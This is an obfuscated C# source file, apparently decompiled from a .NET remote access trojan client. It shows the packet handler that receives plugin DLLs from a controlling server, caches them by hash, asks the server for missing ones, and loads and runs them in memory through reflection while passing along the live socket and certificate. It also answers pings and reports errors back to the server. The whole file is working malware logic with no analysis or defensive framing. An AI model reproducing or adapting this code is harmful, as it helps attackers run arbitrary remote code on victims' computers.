using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using QoJxByZkfRQq;
using TRjqmOcqLzx;
using msGGXERwBGXueNOI;
using yKFnPcLKLkIvyuyev;

namespace cMmGWpngxFJQy;

public static class xzhpUDLIXjgv
{
	[CompilerGenerated]
	private static class ltZFATMhxOzV
	{
		public static CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>> eZHclYMaOzIeK;
	}

	public static List<EwTlhZtGQJxOhT> LOuMbvSdoYro = new List<EwTlhZtGQJxOhT>();

	public static void AIKcIMYWroQqv(object iYgxzGhczCcy)
	{
		try
		{
			EwTlhZtGQJxOhT ewTlhZtGQJxOhT = new EwTlhZtGQJxOhT();
			ewTlhZtGQJxOhT.uTiCyKWwObK((byte[])iYgxzGhczCcy);
			switch (ewTlhZtGQJxOhT.RjmBfFMUGNiO("Packet").NTyFKfiOUtVE)
			{
			case "savePlugin":
				VNtFEJxQkxpTWB.RGZQvgTHyswE(ewTlhZtGQJxOhT.RjmBfFMUGNiO("Hash").NTyFKfiOUtVE, ewTlhZtGQJxOhT.RjmBfFMUGNiO("Dll").zTmwNdOTsSFoX());
				{
					foreach (EwTlhZtGQJxOhT item in LOuMbvSdoYro.ToList())
					{
						if (item.RjmBfFMUGNiO("Dll").NTyFKfiOUtVE == ewTlhZtGQJxOhT.RjmBfFMUGNiO("Hash").NTyFKfiOUtVE)
						{
							fLALIHsdJjwH(item);
							LOuMbvSdoYro.Remove(item);
						}
					}
					break;
				}
			case "plugin":
				try
				{
					if (VNtFEJxQkxpTWB.nLvMzrCkSqqurOO(ewTlhZtGQJxOhT.RjmBfFMUGNiO("Dll").NTyFKfiOUtVE) == null)
					{
						LOuMbvSdoYro.Add(ewTlhZtGQJxOhT);
						EwTlhZtGQJxOhT ewTlhZtGQJxOhT3 = new EwTlhZtGQJxOhT();
						ewTlhZtGQJxOhT3.RjmBfFMUGNiO("Packet").DwBvpudbGNXeL("sendPlugin");
						ewTlhZtGQJxOhT3.RjmBfFMUGNiO("Hashes").DwBvpudbGNXeL(ewTlhZtGQJxOhT.RjmBfFMUGNiO("Dll").NTyFKfiOUtVE);
						rgyWodqfpOexX.hpygdPoBjwmMY(ewTlhZtGQJxOhT3.zdVHdMvzwJZJVpl());
					}
					else
					{
						fLALIHsdJjwH(ewTlhZtGQJxOhT);
					}
					break;
				}
				catch (Exception ex)
				{
					JDmUHRTkLLFM(ex.Message);
					break;
				}
			case "pong":
			{
				rgyWodqfpOexX.FxqfzeWyYVUSjyA = false;
				EwTlhZtGQJxOhT ewTlhZtGQJxOhT2 = new EwTlhZtGQJxOhT();
				ewTlhZtGQJxOhT2.RjmBfFMUGNiO("Packet").DwBvpudbGNXeL("pong");
				ewTlhZtGQJxOhT2.RjmBfFMUGNiO("Message").vKjIWsOitiMS(rgyWodqfpOexX.UNiFYaCzQPnA);
				rgyWodqfpOexX.hpygdPoBjwmMY(ewTlhZtGQJxOhT2.zdVHdMvzwJZJVpl());
				rgyWodqfpOexX.UNiFYaCzQPnA = 0;
				break;
			}
			}
		}
		catch (Exception ex2)
		{
			JDmUHRTkLLFM(ex2.Message);
		}
	}

	private static void fLALIHsdJjwH(EwTlhZtGQJxOhT UWjeCjaJpro)
	{
		dynamic val = Activator.CreateInstance(AppDomain.CurrentDomain.Load(NGisxejvQwVr.qIWGxapWynhKI(VNtFEJxQkxpTWB.nLvMzrCkSqqurOO(UWjeCjaJpro.RjmBfFMUGNiO("Dll").NTyFKfiOUtVE))).GetType("Plugin.Plugin"));
		val.Run(rgyWodqfpOexX.DYzyXnWRoqSug, hFmOFeqzArJ.ehWRUIuUsSH, hFmOFeqzArJ.yihvSlyKIDo, UWjeCjaJpro.RjmBfFMUGNiO("Msgpack").zTmwNdOTsSFoX(), BuKyFBaskOR.oNUfXjDbcUyS, hFmOFeqzArJ.qoYspvTukLNSho, hFmOFeqzArJ.eWjYovOLfWtN, hFmOFeqzArJ.qqxhvBhQRCd);
		OTHHpgcACIPIQzamn();
	}

	private static void OTHHpgcACIPIQzamn()
	{
		EwTlhZtGQJxOhT ewTlhZtGQJxOhT = new EwTlhZtGQJxOhT();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Packet").NTyFKfiOUtVE = "Received";
		rgyWodqfpOexX.hpygdPoBjwmMY(ewTlhZtGQJxOhT.zdVHdMvzwJZJVpl());
		Thread.Sleep(1000);
	}

	public static void JDmUHRTkLLFM(string WpfUnYnpGAtkRcy)
	{
		EwTlhZtGQJxOhT ewTlhZtGQJxOhT = new EwTlhZtGQJxOhT();
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Packet").NTyFKfiOUtVE = "Error";
		ewTlhZtGQJxOhT.RjmBfFMUGNiO("Error").NTyFKfiOUtVE = WpfUnYnpGAtkRcy;
		rgyWodqfpOexX.hpygdPoBjwmMY(ewTlhZtGQJxOhT.zdVHdMvzwJZJVpl());
	}
}
